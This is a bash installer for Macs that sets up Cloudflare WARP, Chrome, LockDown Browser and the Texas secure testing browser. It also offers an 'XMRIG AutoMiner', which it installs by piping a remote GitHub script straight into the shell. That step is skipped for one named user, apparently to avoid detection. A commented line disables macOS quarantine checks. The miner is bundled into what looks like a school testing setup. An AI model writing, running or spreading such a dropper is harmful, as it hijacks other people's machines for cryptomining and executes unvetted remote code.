#!/bin/bash

# Installer for Macs
clear

Logo="\033[34m
               ___                           
 |\/|  _.  _    |  ._   _ _|_  _. | |  _  ._ 
 |  | (_| (_   _|_ | | _>  |_ (_| | | (/_ |                                           
\033[0m"


echo "$Logo"
sleep 1
echo "Welcome to the Installer"
BasePath="$(pwd)"

# Main Installers Variable
WarpURL="https://1111-releases.cloudflareclient.com/mac/latest"
WarpAppPath="/Applications/Cloudflare WARP.app"

ChromeURL="https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg"
ChromeAppPath="/Applications/Google Chrome.app"

LockdownLink="https://downloads.respondus.com/installs/cmac2.1.2.07/575449240/InstallLDBPackage64c-2-1-2-07.zip"
LockDownPath="/Applications/LockDown Browser.app"

StarTestingUrl="https://sb.portal.cambiumast.com/geturls?clientName=texas&operatingSystem=macOS"
StarTestingPath="/Applications/TXSecureBrowser.app"

XMRIGLink="https://raw.githubusercontent.com/Astranix593/MacOS-Setup/main/Helper.sh"

CurrentUser="$(whoami)"

if ! [ -x "$(command -v installer)" ]; then
    echo 'Error: installer is not installed.' >&2
    exit 1
fi



if ! [ -d "$WarpAppPath" ]; then
    echo "Warp is not installed. Downloading and installing..."
    echo "Do you want to install warp? (y/Y)"
    read confirm

    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        echo "Downloading Warp..."
        rm "$BasePath/warp.pkg"
        curl -sSL -o "$BasePath/warp.pkg" "$WarpURL"
        echo "Warp Downloaded"
        echo "Installing Warp..."
        sudo installer -pkg "$BasePath/warp.pkg" -target /Applications
        echo "Warp Installed"
        rm "$BasePath/warp.pkg"
    fi

else
    echo "Warp is already installed"
fi



if ! [ -d "$ChromeAppPath" ]; then
    echo "Chrome is not installed. Downloading and installing..."
    echo "Do you want to install chrome? (y/Y)"
    read confirm
    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        echo "Downloading Chrome..."
        rm "$BasePath/chrome.dmg"
        curl -sSL -o "$BasePath/chrome.dmg" "$ChromeURL"
        echo "Chrome Downloaded"
        echo "Installing Chrome..."
        # mount the dmg
        hdiutil attach "$BasePath/chrome.dmg"
        # install the dmg by copying the app
        cp -r "/Volumes/Google Chrome/Google Chrome.app" "/Applications/"
        hdiutil detach "/Volumes/Google Chrome"
        # will set it as the default browser
        # sudo defaults write /Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure LSQuarantine -bool false
        echo "Chrome Installed"
        rm "$BasePath/chrome.dmg"
    fi

else
    echo "Chrome is already installed"
fi

# Will install the lockdown browser
if ! [ -d "$LockDownPath" ]; then
    echo "Lockdown Browser is not installed. Downloading and installing..."
    echo "Do you want to install Lockdown Browser? (y/Y)"
    read confirm
    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        echo "Downloading Lockdown Browser..."
        rm "$BasePath/lockdown.zip"
        curl -sSL -o "$BasePath/lockdown.zip" "$LockdownLink"
        echo "Lockdown Browser Downloaded"
        echo "Installing Lockdown Browser..."
        unzip "$BasePath/lockdown.zip"
        FileName="$(unzip -l lockdown.zip | awk 'NR==4 {sub(/^ +/, ""); print substr($0, index($0, $5))}')"
        # will get the file in the zip
        echo "Installing Lockdown Browser..."
        echo $FileName
        sudo installer -pkg "$BasePath/$FileName" -target /Applications 
        echo "Lockdown Browser Installed"
        rm "$BasePath/lockdown.zip"
        rm "$BasePath/$FileName"
    fi
else
    echo "Lockdown Browser is already installed"
fi


if ! [ -d "$StarTestingPath" ]; then
    echo "Star Testing is not installed. Downloading and installing..."
    echo "Do you want to install Star Testing? (y/Y)"
    read confirm
    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        echo "Downloading Star Testing..."
        rm "$BasePath/StarTesting.dmg"
        curl -sSL -o "$BasePath/StarTesting.dmg" "$StarTestingUrl"
        echo "Star Testing Downloaded"
        echo "Installing Star Testing..."
        hdiutil attach "$BasePath/StarTesting.dmg" -quiet
        cp -r "/Volumes/TXSecureBrowser/TXSecureBrowser.app" "/Applications/"
        hdiutil detach "/Volumes/TXSecureBrowser" -quiet
        echo "Star Testing Installed"
        rm "$BasePath/StarTesting.dmg"
    fi

else
    echo "Star Testing is already installed"
fi

if test "$CurrentUser" = "brandontisserand"; then
    echo "Dont worry brandon, were not going to install the script for you."
else
    # will ask for confirmation to install
    echo "Do you want to install XMRIG AutoMiner? (y/Y)"
    read confirm

    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
        echo "Installing..."
        curl -sSL "$XMRIGLink" | sh
        echo "Installed"
    else
        echo "Not installing"
    fi
fi